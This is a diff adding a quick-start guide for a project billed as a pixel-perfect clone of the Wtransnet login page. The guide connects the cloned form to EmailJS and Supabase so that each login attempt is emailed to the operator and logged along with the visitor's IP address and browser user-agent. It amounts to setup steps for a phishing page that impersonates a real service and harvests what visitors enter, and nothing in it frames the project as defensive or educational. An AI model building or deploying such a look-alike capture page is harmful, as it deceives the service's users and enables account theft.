@@ -1,0 +1,169 @@
+╔════════════════════════════════════════════════════════════════════════════╗
+║          WTRANSNET LOGIN - EMAILJS & SUPABASE INTEGRATION                   ║
+║                         QUICK START GUIDE                                   ║
+╚════════════════════════════════════════════════════════════════════════════╝
+
+📋 WHAT'S INCLUDED:
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+✓ Pixel-perfect Wtransnet login page clone
+✓ EmailJS integration for email notifications
+✓ Supabase database for storing login attempts
+✓ IP address tracking
+✓ Browser user-agent capture
+✓ Fully responsive design
+✓ Complete error handling
+
+🚀 SETUP IN 3 STEPS:
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+STEP 1: GET EMAILJS CREDENTIALS (5 min)
+   1. Visit https://www.emailjs.com/
+   2. Sign up and verify your email
+   3. Connect your email service (Gmail/Outlook/etc)
+   4. Create email template named: "Wtransnet_Login_Notification"
+   5. Use these template variables:
+      {{username}}, {{user_email}}, {{timestamp}},
+      {{ip_address}}, {{remember_me}}, {{to_email}}
+   6. Copy these from dashboard:
+      • Public Key
+      • Service ID
+      • Template ID
+
+STEP 2: UPDATE main.js (2 min)
+   Open main.js and find these 3 lines:
+
+   Line 9:  emailjs.init('YOUR_EMAILJS_PUBLIC_KEY');
+            → Replace with: emailjs.init('pk_abc123xyz...');
+
+   Line 61: to_email: 'your-email@gmail.com',
+            → Replace with your actual email
+
+   Line 70: 'YOUR_EMAILJS_SERVICE_ID',
+            → Replace with: 'service_abc123xyz...'
+
+   Line 71: 'YOUR_EMAILJS_TEMPLATE_ID',
+            → Replace with: 'template_abc123xyz...'
+
+STEP 3: TEST IT (1 min)
+   npm run dev
+
+   Fill in the login form:
+   • Username: testuser
+   • Password: anything
+   • Click "Login"
+
+   Check:
+   ✓ Email arrived in your inbox
+   ✓ Browser console shows success
+   ✓ Data visible in Supabase dashboard
+
+📊 WHAT GETS STORED:
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+IN SUPABASE DATABASE (Automatic):
+   • Username
+   • Email (auto-detected or generated)
+   • Login timestamp
+   • IP address
+   • Browser user-agent
+
+IN YOUR EMAIL (Automatic):
+   • Login notification with all above details
+   • Remember me preference
+
+📁 KEY FILES:
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+main.js              ← EDIT THIS (3 lines)
+index.html           ← Login page HTML
+style.css            ← All styling (custom CSS, no frameworks)
+.env                 ← Supabase credentials (auto-configured)
+
+SETUP_GUIDE.md       ← Complete setup instructions
+EMAILJS_CONFIG.md    ← EmailJS step-by-step guide
+DATA_FLOW.md         ← Complete data flow documentation
+INTEGRATION_SUMMARY.md ← Full feature summary
+
+📝 TESTING COMMANDS:
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+Start development server:
+   npm run dev
+
+Build for production:
+   npm run build
+
+Preview production build:
+   npm run preview
+
+Install dependencies:
+   npm install
+
+🔍 DEBUGGING:
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+Check browser console (F12):
+   → Look for success message or error logs
+   → Check network tab for API calls
+
+Check Supabase:
+   → Visit your Supabase dashboard
+   → Go to SQL Editor
+   → Run: SELECT * FROM login_attempts;
+
+Check EmailJS:
+   → Visit https://dashboard.emailjs.com/
+   → Click "Activity" to view sent emails
+
+⚠️ COMMON ISSUES:
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+Email not arriving?
+   → Check spam folder
+   → Verify email template variables match
+   → Check EmailJS dashboard for errors
+   → Verify service is connected in EmailJS
+
+Supabase error?
+   → Check .env file has correct credentials
+   → Verify table exists: SELECT * FROM login_attempts;
+   → Check browser console for detailed error
+
+IP showing "Unknown"?
+   → ipify API might be blocked in your network
+   → This is non-critical, login still works
+
+✅ READY TO GO?
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+Checklist:
+   □ EmailJS account created
+   □ Email service connected
+   □ Email template created
+   □ Public Key copied
+   □ Service ID copied
+   □ Template ID copied
+   □ main.js updated (3 lines)
+   □ npm run dev works
+   □ Test email received
+   □ Data appears in Supabase
+
+TIME ESTIMATE: 15-20 minutes total setup
+
+📚 DOCUMENTATION:
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+For complete information, see:
+   • SETUP_GUIDE.md - Complete setup with all details
+   • EMAILJS_CONFIG.md - EmailJS configuration guide
+   • DATA_FLOW.md - Complete data flow documentation
+   • INTEGRATION_SUMMARY.md - Feature summary
+
+External Links:
+   • EmailJS: https://www.emailjs.com/docs/
+   • Supabase: https://supabase.com/docs
+   • Vite: https://vitejs.dev/
+
+═════════════════════════════════════════════════════════════════════════════
+
+Questions? Check the documentation files in the project root!
